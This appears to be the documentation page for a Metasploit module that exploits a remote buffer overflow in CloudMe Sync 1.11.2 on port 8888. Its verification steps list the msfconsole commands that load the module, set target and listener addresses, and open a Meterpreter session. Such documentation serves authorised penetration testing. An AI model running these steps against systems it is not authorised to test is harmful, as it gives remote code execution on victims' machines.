## Description

This module exploits a buffer overflow vulnerability found in [CloudMe Sync v1.11.2](https://www.cloudme.com/downloads/CloudMe_1112.exe).

## Vulnerable Application

An issue was discovered in CloudMe 1.11.2. An unauthenticated remote attacker that can connect to the "CloudMe Sync" client application listening on port 8888 can send a malicious payload causing a buffer overflow condition. This will result in an attacker controlling the program's execution flow and allowing arbitrary code execution.

## Verification Steps
  1. Install CloudMe for Desktop version `v1.11.2`
  2. Start the applicaton (you don't need to create an account)
  3. Start `msfconsole`
  4. Do `use exploit/windows/misc/cloudme_sync2`
  5. Do `set RHOST ip`
  6. Do `set LHOST ip`
  7. Do `exploit`
  8. Verify the Meterpreter session is opened

![alt text](https://github.com/Zeop-CyberSec/cloudme_sync2/raw/master/pictures/clipboard_01.jpeg "module info")

![alt text](https://github.com/Zeop-CyberSec/cloudme_sync2/raw/master/pictures/clipboard_02.jpeg "run exploit")
